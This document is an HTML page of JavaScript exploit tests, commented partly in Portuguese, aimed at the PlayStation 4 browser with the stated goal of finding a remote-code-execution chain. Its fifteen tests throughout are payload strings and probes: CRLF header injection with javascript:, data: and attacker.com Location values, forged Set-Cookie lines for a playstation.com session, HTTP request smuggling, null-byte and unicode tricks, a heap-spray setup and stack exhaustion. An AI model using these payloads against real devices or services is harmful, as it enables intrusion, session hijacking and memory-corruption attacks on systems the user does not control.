<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <title>PS4 Browser Exploit Tests - RCE Chain Hunter</title>
</head>
<body>
    <h1>PS4 Browser RCE Escalation Tests</h1>
    <div id="log"></div>

    <script>
        const log = document.getElementById('log');
        
        function l(msg) {
            const p = document.createElement('p');
            p.textContent = msg;
            log.appendChild(p);
            console.log(msg);
        }

        function separator(title) {
            const h2 = document.createElement('h2');
            h2.textContent = '=== ' + title + ' ===';
            log.appendChild(h2);
        }

        // TEST 1: Memory Corruption - Huge Headers
        separator('T1: Memory Corruption via Huge Headers');
        try {
            const sizes = [10000, 100000, 1000000, 10000000];
            sizes.forEach(size => {
                try {
                    const huge = 'A'.repeat(size);
                    const h = new Headers();
                    h.set('X-Huge', 'val\r\n' + huge);
                    l('T1.' + size + ': Header com ' + size + ' bytes aceito');
                } catch (e) {
                    l('T1.' + size + ': CRASH ou reject - ' + e.message);
                }
            });
        } catch (e) {
            l('T1 ERROR: ' + e.message);
        }

        // TEST 2: Location Header Injection
        separator('T2: Location Header Injection');
        try {
            const payloads = [
                'a\r\nLocation: javascript:alert(1)',
                'a\r\nLocation: data:text/html,<script>alert(2)<\/script>',
                'a\r\nLocation: about:blank',
                'a\r\nLocation: file:///etc/passwd',
                'a\r\nLocation: http://attacker.com'
            ];
            
            payloads.forEach((payload, i) => {
                const h = new Headers();
                h.set('X-Test', payload);
                const val = h.get('X-Test');
                l('T2.' + i + ': ' + (val.includes('\r\n') ? 'VULNERABLE: ' + val : 'Safe'));
            });
        } catch (e) {
            l('T2 ERROR: ' + e.message);
        }

        // TEST 3: PS4 Custom URL Schemes
        separator('T3: PS4 Custom Protocol Injection');
        try {
            const schemes = [
                'psn://',
                'store://',
                'browser://',
                'app://',
                'system://',
                'settings://',
                'user://',
                'game://',
                'ps4://',
                'playstation://'
            ];
            
            schemes.forEach(scheme => {
                try {
                    const h = new Headers();
                    h.set('X-Scheme', 'a\r\nLocation: ' + scheme + 'test\r\n\r\n');
                    const val = h.get('X-Scheme');
                    if (val.includes(scheme)) {
                        l('T3.' + scheme + ': INJECTED - ' + val.substring(0, 100));
                    }
                } catch (e) {
                    l('T3.' + scheme + ': Exception - ' + e.message);
                }
            });
        } catch (e) {
            l('T3 ERROR: ' + e.message);
        }

        // TEST 4: Response Splitting com redirecionamento real
        separator('T4: Response Splitting + Redirect');
        try {
            const blob = new Blob(['test'], {type: 'text/plain\r\nLocation: javascript:alert(3)\r\n\r\n'});
            const url = URL.createObjectURL(blob);
            l('T4.blob: URL criada - ' + url);
            
            fetch(url).then(r => {
                l('T4.fetch: Status=' + r.status + ', Type=' + r.headers.get('Content-Type'));
            }).catch(e => {
                l('T4.fetch: Error - ' + e.message);
            });
        } catch (e) {
            l('T4 ERROR: ' + e.message);
        }

        // TEST 5: Charset Exploits
        separator('T5: Charset/Encoding Exploits');
        try {
            const charsets = [
                'utf-7',
                'utf-16',
                'utf-32',
                'iso-2022-jp',
                'windows-1252\r\nX-Evil: 1'
            ];
            
            charsets.forEach(cs => {
                const h = new Headers();
                h.set('Content-Type', 'text/html; charset=' + cs);
                const val = h.get('Content-Type');
                l('T5.' + cs + ': ' + val);
            });
        } catch (e) {
            l('T5 ERROR: ' + e.message);
        }

        // TEST 6: Multiple Header Injection
        separator('T6: Multiple Header Injection Chain');
        try {
            const h = new Headers();
            const payload = 'value\r\nX-Injected-1: bad1\r\nX-Injected-2: bad2\r\nLocation: javascript:alert(4)\r\n\r\n<script>alert(5)<//script>';
            h.set('X-Multi', payload);
            l('T6.multi: ' + h.get('X-Multi'));
        } catch (e) {
            l('T6 ERROR: ' + e.message);
        }

        // TEST 7: Set-Cookie Injection
        separator('T7: Set-Cookie Injection');
        try {
            const cookies = [
                'a\r\nSet-Cookie: admin=true',
                'a\r\nSet-Cookie: session=HIJACKED; Path=/; Domain=.playstation.com',
                'a\r\nSet-Cookie: token=EVIL\r\nSet-Cookie: role=admin'
            ];
            
            cookies.forEach((c, i) => {
                const h = new Headers();
                h.set('X-Cookie', c);
                l('T7.' + i + ': ' + h.get('X-Cookie'));
            });
        } catch (e) {
            l('T7 ERROR: ' + e.message);
        }

        // TEST 8: Null Byte Injection
        separator('T8: Null Byte Injection');
        try {
            const nulls = [
                'value\x00.exe',
                'text/html\x00bad',
                'a\r\n\x00X-Evil: 1',
                'data:text/html\x00,<script>alert(6)<\/script>'
            ];
            
            nulls.forEach((n, i) => {
                try {
                    const h = new Headers();
                    h.set('X-Null', n);
                    l('T8.' + i + ': Aceito - len=' + h.get('X-Null').length);
                } catch (e) {
                    l('T8.' + i + ': Rejected - ' + e.message);
                }
            });
        } catch (e) {
            l('T8 ERROR: ' + e.message);
        }

        // TEST 9: WebSocket Upgrade Injection
        separator('T9: WebSocket Upgrade Injection');
        try {
            const h = new Headers();
            h.set('X-WS', 'a\r\nUpgrade: websocket\r\nConnection: Upgrade\r\nSec-WebSocket-Key: dGhlIHNhbXBsZSBub25jZQ==\r\n\r\n');
            l('T9.upgrade: ' + h.get('X-WS'));
        } catch (e) {
            l('T9 ERROR: ' + e.message);
        }

        // TEST 10: Content-Length Manipulation
        separator('T10: Content-Length Smuggling');
        try {
            const lengths = [
                'a\r\nContent-Length: 0\r\n\r\nSMUGGLED',
                'a\r\nContent-Length: 9999999999',
                'a\r\nContent-Length: -1',
                'a\r\nTransfer-Encoding: chunked\r\n\r\n0\r\n\r\nSMUGGLED'
            ];
            
            lengths.forEach((l2, i) => {
                const h = new Headers();
                h.set('X-Length', l2);
                l('T10.' + i + ': ' + h.get('X-Length').substring(0, 80));
            });
        } catch (e) {
            l('T10 ERROR: ' + e.message);
        }

        // TEST 11: Heap Spray Preparation
        separator('T11: Heap Spray Setup');
        try {
            const spray = [];
            for (let i = 0; i < 1000; i++) {
                const h = new Headers();
                h.set('X-Spray', 'A'.repeat(1000) + '\r\n' + 'B'.repeat(1000));
                spray.push(h);
            }
            l('T11: Created 1000 headers objects for heap spray');
            
            // Tentar triggerar garbage collection
            spray.length = 0;
            l('T11: Cleared spray array (GC trigger attempt)');
        } catch (e) {
            l('T11 ERROR: ' + e.message);
        }

        // TEST 12: Response Constructor Exploit
        separator('T12: Response Constructor Manipulation');
        try {
            const badHeaders = new Headers();
            badHeaders.set('Content-Type', 'text/html\r\n\r\n<script>alert(7)<\/script>');
            
            const resp = new Response('<html><body>TEST</body></html>', {
                status: 200,
                headers: badHeaders
            });
            
            l('T12.status: ' + resp.status);
            l('T12.ct: ' + resp.headers.get('Content-Type'));
            
            resp.text().then(txt => {
                l('T12.body: ' + txt.substring(0, 100));
            });
        } catch (e) {
            l('T12 ERROR: ' + e.message);
        }

        // TEST 13: Data URL avec Header Injection
        separator('T13: Data URL Advanced Injection');
        try {
            const dataUrls = [
                'data:text/html\r\n,<script>alert(8)<\/script>',
                'data:text/html;base64\r\n,PHNjcmlwdD5hbGVydCg5KTwvc2NyaXB0Pg==',
                'data:application/javascript\r\n,alert(10)',
                'data:text/html;charset=utf-7\r\n,+ADw-script+AD4-alert(11)+ADw-/script+AD4-'
            ];
            
            dataUrls.forEach((url, i) => {
                try {
                    fetch(url).then(r => r.text()).then(txt => {
                        l('T13.' + i + ': Fetched - ' + txt.substring(0, 50));
                    }).catch(e => {
                        l('T13.' + i + ': Fetch failed - ' + e.message);
                    });
                } catch (e) {
                    l('T13.' + i + ': Exception - ' + e.message);
                }
            });
        } catch (e) {
            l('T13 ERROR: ' + e.message);
        }

        // TEST 14: Stack Exhaustion
        separator('T14: Stack Exhaustion via Headers');
        try {
            function recurse(depth) {
                if (depth > 10000) return;
                const h = new Headers();
                h.set('X-Recurse', 'a\r\n'.repeat(100));
                recurse(depth + 1);
            }
            recurse(0);
            l('T14: Recursion completed without crash');
        } catch (e) {
            l('T14 ERROR/CRASH: ' + e.message);
        }

        // TEST 15: Unicode/UTF Exploits
        separator('T15: Unicode Exploitation');
        try {
            const unicodes = [
                'test\u0000\r\nX-Evil: 1',
                'test\u000A\u000DX-Evil: 2',
                'test\uFEFF\r\nX-Evil: 3',
                'test\u2028\u2029X-Evil: 4',
                '\uD800\uDC00\r\nX-Evil: 5'
            ];
            
            unicodes.forEach((u, i) => {
                const h = new Headers();
                h.set('X-Unicode', u);
                const val = h.get('X-Unicode');
                l('T15.' + i + ': len=' + val.length + ', has_evil=' + val.includes('Evil'));
            });
        } catch (e) {
            l('T15 ERROR: ' + e.message);
        }

        l('');
        l('=== TODOS OS TESTES COMPLETADOS ===');
        l('Verifique o console e procure por crashes, redirects ou comportamentos anormais');
    </script>
</body>
</html>
